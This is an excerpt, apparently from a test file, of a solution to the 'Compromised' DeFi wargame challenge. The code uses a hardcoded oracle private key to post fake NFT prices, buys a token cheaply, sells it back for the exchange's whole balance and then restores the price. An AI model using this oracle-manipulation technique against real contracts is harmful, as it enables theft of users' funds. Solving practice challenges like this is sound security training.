...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    const oracle_1 = new ethers.Wallet(
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      ethers.provider
    );
    const oracle_2 = new ethers.Wallet(
    ...
    await this.oracle.connect(oracle_1).postPrice(symbol, 1);
    await this.oracle.connect(oracle_2).postPrice(symbol, 1);

    // We are kinda cheating here with the intialization.
    // The code will most likely finish executing before the event listener
    // runs here.
    // But this still works because we only mint a single NFT, which has id 0
    // Alternatively, we should get the event from the `receipt`.
    let token_id = 0;
    this.exchange.on("TokenBought", (_buyer, tokenId, _price) => {
      token_id = tokenId;
    });
    ...
    let exchange_balance = await ethers.provider.getBalance(
      this.exchange.address
    );
    await this.oracle.connect(oracle_1).postPrice(symbol, exchange_balance);
    await this.oracle.connect(oracle_2).postPrice(symbol, exchange_balance);

    await this.nftToken
      .connect(attacker)
      .approve(this.exchange.address, token_id);
    await this.exchange.connect(attacker).sellOne(token_id);

    await this.oracle.connect(oracle_1).postPrice(symbol, INITIAL_NFT_PRICE);
    await this.oracle.connect(oracle_2).postPrice(symbol, INITIAL_NFT_PRICE);
  });
